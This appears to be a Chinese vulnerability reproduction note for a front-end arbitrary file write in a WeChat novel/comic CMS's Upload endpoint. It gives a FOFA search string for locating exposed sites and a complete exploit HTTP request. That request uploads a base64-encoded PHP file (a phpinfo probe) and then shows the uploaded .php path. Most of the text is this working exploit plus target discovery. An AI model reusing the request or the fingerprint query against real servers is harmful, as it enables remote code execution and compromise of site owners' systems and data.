# 微信公众号小说漫画系统Upload存在任意文件写入漏洞

# 一、漏洞简介
微信公众号小说漫画系统前台任意文件写入漏洞，允许攻击者上传恶意文件到服务器，可能导致远程代码执行、网站篡改或其他形式的攻击，严重威胁系统和数据安全。

# 二、影响版本
+ 微信公众号小说漫画系统

# 三、资产测绘
+ fofa`"/Public/home/mhjs/jquery.js"`
+ 特征

![1728355919795-a0aaf6bf-ee63-459d-998f-cf682a606504.png](./img/8LunnYa6EiTNHnHX/1728355919795-a0aaf6bf-ee63-459d-998f-cf682a606504-753828.png)

# 四、漏洞复现
```java
POST /index.php?m=&c=IndexAjax&a=Upload HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br, zstd
Accept-Language: zh-CN,zh;q=0.9,ru;q=0.8,en;q=0.7
Cache-Control: no-cache
Connection: keep-alive
Content-Length: 78
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=bf13e78oe1uqp8nh3crld1gu55; uloginid=107639
Host: 
Origin: http://xxx
Pragma: no-cache
Referer: http://xx/index.php?m=&c=IndexAjax
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36
sec-ch-ua: "Google Chrome";v="129", "Not=A?Brand";v="8", "Chromium";v="129"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"

img=data:image/php;base64,YTw/cGhwIHBocGluZm8oKTs/Pg==&size=50
```

![1728355603282-a1e4392b-95c9-483f-9f2c-eb13b14f4231.png](./img/8LunnYa6EiTNHnHX/1728355603282-a1e4392b-95c9-483f-9f2c-eb13b14f4231-087530.png)

```java
https://xxx/Upload/20241008/104249_499.php
```

![1728355659763-20f11b95-adef-4522-8035-d2c07d3d39d2.png](./img/8LunnYa6EiTNHnHX/1728355659763-20f11b95-adef-4522-8035-d2c07d3d39d2-906388.png)



> 更新: 2024-10-22 09:36:08  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/gzk5f87zuin8ipgr>